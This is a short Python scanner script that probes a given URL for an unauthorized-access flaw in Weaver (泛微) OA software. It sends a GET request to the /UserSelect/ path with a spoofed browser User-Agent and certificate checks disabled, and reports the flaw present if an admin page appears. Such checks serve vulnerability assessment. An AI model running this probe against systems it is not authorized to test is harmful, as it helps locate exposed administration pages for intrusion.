import re
import time
import requests

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
   
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'   
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",  
        }
    vuln_url=target_url+"/UserSelect/"
    success_msg = now_time() + '[SUCCESS]  泛微未授权访问漏洞'
    shell_msg = now_time() + ':{}'.format(vuln_url)
    warning_msg = now_time() + '[WARNING]  泛微未授权访问漏洞不存在'
    error_msg = now_time() + '[泛微未授权访问漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.get(vuln_url, headers=headers, verify=False)
        if url.status_code== 200 and '系统管理' in url.text:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
 
